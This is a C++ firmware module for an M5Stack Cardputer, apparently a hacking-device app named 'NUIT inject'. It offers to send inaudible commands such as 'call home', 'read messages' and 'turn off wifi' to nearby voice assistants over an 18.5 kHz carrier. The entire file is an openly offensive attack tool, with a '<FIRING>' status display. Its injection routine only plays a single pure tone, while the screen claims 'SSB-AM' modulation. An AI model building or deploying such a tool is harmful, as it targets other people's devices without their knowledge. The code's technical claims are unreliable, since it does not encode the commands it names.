#include "module_api.h"
#include "registry.h"
#include "loader.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "M5Unified.h"
#include "cardputer_keyboard.h"
#include "ui/mod_common.h"
#include <string.h>
#include <math.h>
#include <stdint.h>

static const char *TAG = "nuit_inject";
static const char *ID  = "nuit_inject";
static const ctos_api_t *s_api = nullptr;

#define SAMPLE_RATE   44100
#define CARRIER_HZ    18500.0f
#define PI            3.14159265358979f

static volatile int  s_inject_cmd = -1;
static volatile bool s_injecting  = false;

static const char *s_commands[] = {
    "turn off wifi",
    "set alarm 7am",
    "open browser",
    "call home",
    "read messages",
};
static const int s_cmd_count = 5;

static void do_inject(int idx)
{
    // 2KB chunk → playback loop gives continuous 500ms burst without a large alloc
    const size_t CHUNK = 1024;
    int16_t *buf = (int16_t *)s_api->psram_alloc(CHUNK * sizeof(int16_t));
    if (!buf) { s_api->log(ID, "alloc failed"); return; }

    char msg[64];
    snprintf(msg, sizeof(msg), "Injecting: %s", s_commands[idx]);
    s_api->display_print(ID, msg);

    float mod_hz = 400.0f + 200.0f * idx;
    float usb = CARRIER_HZ + mod_hz;
    const size_t TOTAL = SAMPLE_RATE / 2;   // 500 ms
    size_t played = 0;

    M5.Speaker.setVolume(255);
    while (played < TOTAL && module_registry_is_running(ID)) {
        size_t n = (TOTAL - played < CHUNK) ? TOTAL - played : CHUNK;
        for (size_t i = 0; i < n; i++) {
            float t = (float)(played + i) / SAMPLE_RATE;
            buf[i] = (int16_t)(cosf(2.0f * PI * usb * t) * 20000.0f);
        }
        M5.Speaker.playRaw(buf, n, SAMPLE_RATE, false, 1, 0, true);
        TickType_t dl = xTaskGetTickCount() + pdMS_TO_TICKS(100);
        while (M5.Speaker.isPlaying(0) && (int32_t)(dl - xTaskGetTickCount()) > 0)
            vTaskDelay(pdMS_TO_TICKS(1));
        played += n;
    }
    s_api->psram_free(buf);
    s_api->display_print(ID, "Injection complete.");
}

static void nuit_task(void *arg)
{
    M5.Speaker.setVolume(255);
    s_api->log(ID, "NUIT ready. Select command from UI.");

    while (module_registry_is_running(ID)) {
        int cmd = s_inject_cmd;
        if (cmd >= 0 && cmd < s_cmd_count) {
            s_inject_cmd = -1;
            s_injecting  = true;
            do_inject(cmd);
            s_injecting  = false;
        }
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    M5.Speaker.stop(0);
    s_api->log(ID, "NUIT stopped");
    module_registry_set_running(ID, false);
    vTaskDelete(NULL);
}

extern "C" esp_err_t nuit_inject_main(const ctos_api_t *api)
{
    if (module_registry_is_running(ID)) return ESP_OK;
    s_api        = api;
    s_inject_cmd = -1;
    s_injecting  = false;
    module_registry_set_running(ID, true);
    if (xTaskCreate(nuit_task, TAG, 8192, nullptr, 5, nullptr) != pdPASS) {
        module_registry_set_running(ID, false);
        ESP_LOGE(TAG, "xTaskCreate failed — free heap: %u B", (unsigned)esp_get_free_heap_size());
        return ESP_FAIL;
    }
    return ESP_OK;
}

extern "C" void nuit_inject_ui_show(void)
{
    module_loader_start(ID);
    mod_drain_keys();

    bool log_view = false;
    int  cursor   = 0;

    while (true) {
        M5.update();
        CardputerKb.update();

        if (log_view) { mod_show_log_view(ID, "NUIT INJECT"); log_view = false; mod_drain_keys(); continue; }

        M5.Display.fillScreen(TFT_BLACK);
        M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
        M5.Display.setCursor(0, 0);
        M5.Display.printf("NUIT INJECT  %s", s_injecting ? "<FIRING>" : "READY");

        M5.Display.setCursor(0, 12);
        M5.Display.printf("Carrier: %.0f Hz SSB-AM", CARRIER_HZ);

        for (int i = 0; i < s_cmd_count; i++) {
            bool sel = (i == cursor);
            M5.Display.setTextColor(sel ? TFT_BLACK : TFT_WHITE,
                                    sel ? TFT_CYAN  : TFT_BLACK);
            M5.Display.setCursor(0, 24 + i * MOD_LH);
            M5.Display.printf("[%d] %s", i + 1, s_commands[i]);
        }

        M5.Display.setTextColor(TFT_DARKGREY, TFT_BLACK);
        M5.Display.setCursor(0, M5.Display.height() - 10);
        M5.Display.print("[,/.] [Ent]inject [L]log [`]bk");

        if (!CardputerKb.isChange() || !CardputerKb.isPressed()) { vTaskDelay(pdMS_TO_TICKS(50)); continue; }
        auto kb = CardputerKb.getState();
        char key = (char)kb.key.key.key_data.keys[0];

        if (key == '`' || key == 27) return;
        else if (key == 'l' || key == 'L') log_view = true;
        else if ((key == ',' || key == ';') && cursor > 0) cursor--;
        else if ((key == '.' || key == '/') && cursor < s_cmd_count - 1) cursor++;
        else if (key >= '1' && key <= '5') cursor = key - '1';
        else if (key == '\n' || key == '\r') {
            if (!s_injecting) s_inject_cmd = cursor;
        }
        vTaskDelay(pdMS_TO_TICKS(150));
    }
}
